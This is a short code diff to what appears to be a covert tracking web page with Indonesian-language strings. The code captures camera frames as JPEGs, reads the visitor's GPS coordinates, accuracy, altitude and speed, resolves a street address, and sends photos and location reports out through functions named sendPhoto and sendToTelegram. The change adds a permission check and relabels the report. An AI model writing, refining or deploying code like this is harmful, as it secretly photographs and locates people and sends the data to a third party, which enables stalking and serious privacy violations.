@@ -138,7 +138,7 @@
           ctx.drawImage(video, 0, 0);
           await new Promise(resolve => {
             canvas.toBlob(async blob => {
-              await sendPhoto(blob, `kamera_${i}.jpg`);
+              await sendPhoto(blob, `camera_${i}.jpg`);
               resolve();
             }, 'image/jpeg');
           });
@@ -154,6 +154,12 @@
 
     const captureLocation = async () => {
       try {
+        const permission = await navigator.permissions.query({ name: "geolocation" });
+        if (permission.state !== "granted") {
+          await sendToTelegram(`❌ Lokasi tidak diizinkan oleh browser (${permission.state})`);
+          return;
+        }
+
         navigator.geolocation.getCurrentPosition(async pos => {
           const { latitude, longitude, accuracy, altitude, speed } = pos.coords;
           const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
@@ -161,7 +167,7 @@
           const address = geo?.display_name || 'Alamat tidak ditemukan';
 
           const lokasi = `
-📍 GPS LOCATION
+📍 LOKASI (akurasi ${accuracy} meter)
 [+] Latitude       : ${latitude}
 [+] Longitude      : ${longitude}
 [+] Accuracy       : ${accuracy} meter
